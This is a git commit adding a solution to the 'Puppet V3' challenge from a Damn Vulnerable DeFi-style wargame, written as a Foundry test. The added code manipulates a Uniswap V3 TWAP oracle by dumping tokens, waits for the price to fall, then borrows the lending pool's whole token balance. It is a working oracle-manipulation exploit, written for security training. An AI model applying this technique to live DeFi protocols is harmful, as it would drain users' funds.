a602f701a6bc9ea4b70e878bd64252853c29a42d
alekoisaev <alekoisaev@gmail.com>
2024-08-06 03:31:39 +0400

    solve Puppet V3

--- test/puppet-v3/PuppetV3.t.sol
+++ test/puppet-v3/PuppetV3.t.sol
@@ -10,6 +10,7 @@ import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -119,6 +120,36 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+        weth.approve(address(lendingPool), type(uint256).max);
+
+        ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+
+        token.approve(address(swapRouter), type(uint256).max);
+        swapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams({
+                tokenIn: address(token),
+                tokenOut: address(weth),
+                fee: FEE,
+                recipient: player,
+                deadline: block.timestamp,
+                amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            })
+        );
+
+        for (uint256 i = 1; i < 115; i++) {
+            skip(1);
+
+            if (weth.balanceOf(player) > lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)) {
+                lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+                break;
+            }
+        }
+
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
         
     }
 
